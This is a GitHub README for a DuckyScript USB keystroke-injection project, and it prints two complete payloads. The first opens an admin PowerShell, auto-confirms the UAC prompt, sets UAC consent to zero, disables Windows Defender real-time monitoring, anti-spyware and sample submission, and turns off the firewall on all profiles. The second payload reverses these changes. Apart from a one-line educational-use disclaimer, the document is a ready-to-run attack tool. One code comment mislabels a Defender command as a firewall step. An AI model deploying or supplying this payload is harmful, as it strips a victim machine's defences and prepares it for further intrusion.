# DisableWinSecurity
DuckyScript-DisableWinSecurity is a fork based on the project by [yokokho](https://github.com/yokokho/Another-Rubber-Duck-Payloads). The purpose of this project is simply to add new features to the original project.

---

* [Preamble](#preamble)
* [Development](#development)
  + [Disable_WinSecurity](#Disable_WinSecurity)
  + [Re-enable_WinSecurity](#Re-enable_WinSecurity)
* [Disclaimer](#disclaimer)

## Preamble

The original project contained a DuckyScript payload to disable all essential security measures on the target device, by reducing the level of security of the target device's User Account Control (UAC) settings to the minimum, disabling Automatic Sample Submission and Virus and Threat Protection in Windows Defender, and disabling Windows Firewall. All of these actions are made possible by instructing the DuckyScript payload to use Windows PowerShell.

Judging by the methodology of the original payload, we can deduce that it is possible for the end user to undo the changes made by the aforementioned payload by utilizing Windows PowerShell as well. Therefore, we will need to create a second payload, which will focus on restoring the default settings for the target device's User Account Control (UAC) settings, Windows Defender and Windows Firewall.

## Development

### Disable_WinSecurity

```
REM Automation for Disabling Essential Security Features on Target Device
DEFAULTDELAY 1000
WINDOWS r
REM Open PowerShell as Administrator
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
REM Disable Windows UAC
STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
ENTER
REM Disable Automatic Sample Submission, then Virus and Threat Protection in Windows Defender
STRING Set-MpPreference -DisableBlockAtFirstSeen $true
ENTER
STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
ENTER
REM Disable Windows Firewall
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
ENTER
STRING exit
ENTER
```

### Re-enable_WinSecurity
```
REM Automation for Re-enabling Essential Security Features on Target Device
DEFAULTDELAY 1000
WINDOWS r
REM Open PowerShell as Administrator
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
REM Restore Windows UAC to Its Original Value
STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 5
ENTER
REM Re-enable Windows Firewall
STRING Set-MpPreference -DisableRealtimeMonitoring $false
ENTER
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
ENTER
REM Re-enable Virus and Threat Protection, then Automatic Sample Submission in Windows Defender
STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force
ENTER
STRING Set-MpPreference -DisableBlockAtFirstSeen $false
ENTER
STRING exit
ENTER
```

## Disclaimer

This project is intended to be used for testing, training, and educational purposes only.  
Never use it to do harm or create damage!  
